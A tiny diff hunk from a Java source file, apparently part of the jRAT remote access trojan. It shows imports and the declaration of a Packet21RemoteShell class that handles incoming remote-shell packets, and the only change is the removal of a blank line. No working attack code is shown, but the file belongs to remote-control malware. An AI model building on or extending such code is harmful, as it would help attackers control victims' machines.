@@ -5,7 +5,6 @@ import java.io.DataInputStream;
 import pro.jrat.Slave;
 import pro.jrat.ui.frames.FrameRemoteShell;
 
-
 public class Packet21RemoteShell extends AbstractIncomingPacket {
 
 	@Override
